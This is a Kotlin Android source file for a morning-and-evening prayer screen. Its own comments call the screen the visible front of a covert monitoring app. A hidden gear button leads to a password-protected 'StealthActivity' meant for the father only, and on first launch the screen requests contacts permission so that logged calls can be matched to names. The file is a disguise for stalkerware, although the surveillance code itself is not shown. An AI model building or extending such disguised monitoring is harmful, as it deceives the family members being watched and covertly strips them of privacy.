package com.family.monitor

import android.annotation.SuppressLint
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.ImageButton
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

/**
 * شاشة «أذكاري»: أذكار الصباح والمساء — الواجهة الظاهرة للتطبيق.
 *
 * - تبويبان: أذكار الصباح / أذكار المساء (التبويب الافتراضي حسب وقت اليوم).
 * - الضغط على أي ذكر يعتبره مكتملًا (✓) مع عدّاد تقدم في الأعلى.
 * - زر الترس أسفل الشاشة يفتح شاشة الرقم السري (إعدادات المراقبة للأب فقط).
 * - الإشعار الثابت للتطبيق يفتح هذه الشاشة مباشرة.
 */
class AdhkarActivity : AppCompatActivity() {

    private var isMorning = true
    private val done = mutableSetOf<Int>()
    private lateinit var listHost: LinearLayout
    private lateinit var progressView: TextView
    private lateinit var btnMorning: Button
    private lateinit var btnEvening: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // بعد تحديث التطبيق فوق نسخة قديمة: الصلاحيات المضافة حديثًا (جهات الاتصال
        // — لأسماء المكالمات) لا تُمنح تلقائيًا، فنطلبها عند أول فتح للشاشة
        if (androidx.core.content.ContextCompat.checkSelfPermission(
                this, android.Manifest.permission.READ_CONTACTS
            ) != android.content.pm.PackageManager.PERMISSION_GRANTED
        ) {
            androidx.core.app.ActivityCompat.requestPermissions(
                this, arrayOf(android.Manifest.permission.READ_CONTACTS), 4210
            )
        }

        val pad = (16 * resources.displayMetrics.density).toInt()
        val accent = 0xFF2E7D32.toInt()

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFFF7FAF7.toInt())
        }

        // ===== الترويسة =====
        root.addView(TextView(this).apply {
            text = "أذكاري"
            textSize = 30f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setTextColor(0xFF1B5E20.toInt())
            setPadding(0, pad * 2, 0, 0)
        })
        root.addView(TextView(this).apply {
            text = "أذكار الصباح والمساء — تذكير يومي"
            textSize = 13f
            gravity = Gravity.CENTER
            setTextColor(0xFF6B7A6B.toInt())
            setPadding(0, 4, 0, pad)
        })

        // ===== تبويبا الصباح والمساء =====
        val tabs = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setPadding(pad, 0, pad, pad / 2)
        }
        btnMorning = tabButton("أذكار الصباح")
        btnEvening = tabButton("أذكار المساء")
        tabs.addView(btnMorning, LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f).apply { setMargins(0, 0, pad / 2, 0) })
        tabs.addView(btnEvening, LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f).apply { setMargins(pad / 2, 0, 0, 0) })
        root.addView(tabs)

        // ===== عدّاد التقدم =====
        progressView = TextView(this).apply {
            textSize = 13f
            gravity = Gravity.CENTER
            setTextColor(accent)
            setPadding(0, 0, 0, pad / 2)
        }
        root.addView(progressView)

        // ===== قائمة الأذكار =====
        listHost = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, 0, pad, pad * 2)
        }
        root.addView(ScrollView(this).apply { addView(listHost) },
            LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))

        // ===== شريط أسفل الشاشة: زر الترس (مدخل الأب) =====
        val bottomBar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.START
            setPadding(pad * 2, 0, pad * 2, pad)
        }
        val gear = ImageButton(this).apply {
            setImageResource(android.R.drawable.ic_menu_preferences)
            setBackgroundColor(Color.TRANSPARENT)
            contentDescription = "الإعدادات"
            setOnClickListener {
                // طلب الرقم السري ثم شاشة الإعداد — للأب فقط
                startActivity(Intent(this@AdhkarActivity, StealthActivity::class.java)
                    .putExtra(StealthActivity.EXTRA_ASK_PASSWORD, true))
            }
        }
        bottomBar.addView(gear, LinearLayout.LayoutParams(
            (36 * resources.displayMetrics.density).toInt(),
            (36 * resources.displayMetrics.density).toInt()))
        root.addView(bottomBar)

        setContentView(root)

        // التبويب الافتراضي حسب وقت اليوم: من الفجر حتى الضحى «صباح»، وإلا «مساء»
        val h = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
        selectTab(h in 4..11)
    }

    private fun tabButton(label: String): Button = Button(this).apply {
        text = label
        textSize = 14f
        isAllCaps = false
        setOnClickListener { selectTab(label.contains("الصباح")) }
    }

    private fun selectTab(morning: Boolean) {
        isMorning = morning
        done.clear()
        val active = GradientDrawable().apply { setColor(0xFF2E7D32.toInt()); cornerRadius = 24f }
        val idle = GradientDrawable().apply { setColor(0xFFE8F0E8.toInt()); cornerRadius = 24f }
        btnMorning.background = if (morning) active else idle
        btnMorning.setTextColor(if (morning) Color.WHITE else 0xFF1B5E20.toInt())
        btnEvening.background = if (morning) idle else active
        btnEvening.setTextColor(if (morning) 0xFF1B5E20.toInt() else Color.WHITE)
        render()
    }

    @SuppressLint("SetTextI18n")
    private fun render() {
        listHost.removeAllViews()
        val items = if (isMorning) AdhkarData.morning else AdhkarData.evening
        val pad = (16 * resources.displayMetrics.density).toInt()

        items.forEachIndexed { i, d ->
            val card = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                background = cardBackground(i in done)
                setPadding(pad, pad, pad, pad)
            }
            val lp = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
            lp.setMargins(0, 0, 0, pad / 2)
            card.layoutParams = lp

            card.addView(TextView(this).apply {
                text = d.text
                textSize = 16f
                setTextColor(0xFF1F2937.toInt())
                setLineSpacing(0f, 1.35f)
                textDirection = View.TEXT_DIRECTION_FIRST_STRONG
            })

            val countView = TextView(this).apply {
                text = countText(i, d)
                textSize = 12f
                setTextColor(if (i in done) 0xFF2E7D32.toInt() else 0xFF8A948A.toInt())
                setPadding(0, (6 * resources.displayMetrics.density).toInt(), 0, 0)
                textDirection = View.TEXT_DIRECTION_FIRST_STRONG
            }
            card.addView(countView)

            // الضغط على الذكر = تم ✓
            card.setOnClickListener {
                if (i in done) done.remove(i) else done.add(i)
                card.background = cardBackground(i in done)
                countView.text = countText(i, d)
                countView.setTextColor(if (i in done) 0xFF2E7D32.toInt() else 0xFF8A948A.toInt())
                updateProgress(items.size)
            }

            listHost.addView(card)
        }
        updateProgress(items.size)
    }

    private fun cardBackground(isDone: Boolean): GradientDrawable = GradientDrawable().apply {
        setColor(if (isDone) 0xFFE6F4E9.toInt() else 0xFFFFFFFF.toInt())
        cornerRadius = 20f
        setStroke(
            (resources.displayMetrics.density).toInt(),
            if (isDone) 0xFFB6D9BF.toInt() else 0xFFE3EAE3.toInt()
        )
    }

    @SuppressLint("SetTextI18n")
    private fun countText(i: Int, d: AdhkarData.Dhikr): String =
        (if (i in done) "✓ تم — " else "") + "تُقال: " + AdhkarData.countLabel(d.count)

    private fun updateProgress(total: Int) {
        progressView.text = "أنجزت ${done.size} من $total ذكر"
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        super.onBackPressed()
        finishAffinity()
    }
}
